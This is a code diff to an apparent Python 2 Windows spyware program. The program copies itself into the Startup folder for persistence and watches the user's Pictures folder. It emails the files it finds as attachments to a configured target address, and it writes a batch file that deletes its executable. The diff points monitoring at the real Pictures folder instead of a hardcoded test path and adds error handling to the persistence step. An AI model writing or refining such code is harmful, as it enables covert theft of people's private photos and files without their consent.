@@ -12,6 +12,7 @@ import shutil
 import socket
 import thread
 import select
+import subprocess
 from urllib2 import urlopen
 
 from multiprocessing import Process
@@ -50,11 +51,18 @@ execute_time = 15 #one day to execute
 
 #test passed
 def _add_to_startup():
-    pic_path = os.path.join(os.path.expandvars("%userprofile%"),
-            "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
-    shutil.copy2(os.getcwd() +'/'+ os.path.splitext(__file__)[0] + ".exe",\
-                pic_path + os.path.splitext(__file__)[0] + ".exe")
-    logging.info("Add to startup successly")
+    try:
+
+        pic_path = os.path.join(os.path.expandvars("%userprofile%"),
+                "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
+        shutil.copy2(os.getcwd() +'/'+ os.path.splitext(__file__)[0] + ".exe",\
+                    pic_path + os.path.splitext(__file__)[0] + ".exe")
+        logging.info("Add to startup successly")
+        return True
+    except Exception as e:
+        logging.info("Add to startup faild ")
+        logging.error(e)
+        return False
 
 def _delete_exe():
     exe_path = os.path.join(os.path.expandvars("%userprofile%"),\
@@ -67,10 +75,11 @@ def _delete_exe():
         f.write("@ping 127.0.0.1 -n 5 -w 1000 > nul\n")
         #f.write("del %s\n" %exe_path)
         #if the path contains space, add "your path"
-        f.write('del "%s"\n' %py_path)
+        f.write('del "%s"\n' %exe_path)
         f.close()
-    p = Popen(exe_path + 'protect.bat',cwd=exe_path)
-    stdout, stderr = p.communicate()
+    #p = Popen(exe_path + 'protect.bat',cwd=exe_path)
+    p = subprocess.Popen(exe_path + 'protect.bat', creationflags=subprocess.CREATE_NEW_CONSOLE)
+    #stdout, stderr = p.communicate()
 
     logging.info("Clean up!")
 
@@ -158,7 +167,7 @@ def _init(pic_path, config_location):
                         files_list = []
                         current_files_size = 0
                         attachment_size = 0
-    if files_list != []:
+    if files_list != []:  #to avoid email without attachment
         email_client.mail(target_email,
                subject,
                content,
@@ -169,11 +178,13 @@ def _init(pic_path, config_location):
     last_send_time = sys_init_time
 
     config_utils._update_config(config_location,'filesys','is_first_time','false')
-    _add_to_startup()
-    logging.info("System initing send time %s" %last_send_time)
-    logging.info("System inited at %s." %time.strftime("%Y-%m-%d %H:%M:%S"))
-    logging.info("System init end")
-    logging.info("------------------------------------")
+    if _add_to_startup():
+        logging.info("System initing send time %s" %last_send_time)
+        logging.info("System inited at %s." %time.strftime("%Y-%m-%d %H:%M:%S"))
+        logging.info("System init end")
+        logging.info("------------------------------------")
+    else:
+        logging.info("System init faild! Add to startup failed")
 #test passed. But not well
 def _single_file_monitor(f):
     global last_send_time
@@ -359,8 +370,8 @@ if __name__ == '__main__':
     try:
         pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")
         handle_path = []
-        #handle_path.append(pic_path)
-        handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
+        handle_path.append(pic_path)
+        #handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
 
         exe_path = os.path.join(os.path.expandvars("%userprofile%"),
                 "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
